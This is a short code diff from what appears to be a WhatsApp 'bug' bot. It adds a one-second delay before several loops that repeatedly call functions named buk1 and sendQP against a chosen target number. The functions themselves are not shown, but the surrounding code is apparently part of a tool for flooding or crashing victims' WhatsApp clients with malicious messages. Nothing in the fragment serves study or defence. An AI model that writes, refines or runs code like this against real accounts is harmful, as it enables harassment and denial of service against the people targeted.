@@ -2150,6 +2150,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
   
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
@@ -2194,6 +2195,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
 
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
@@ -2239,6 +2241,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
 
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
@@ -2284,6 +2287,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
 
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, "Punten", 1020000, Ptcp = true);
 await sendQP(target, wanted)
@@ -2317,6 +2321,7 @@ var contactInfo = await viper.onWhatsApp(target);
   }
 
 reply(bugres)
+await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
 await sleep(1500);
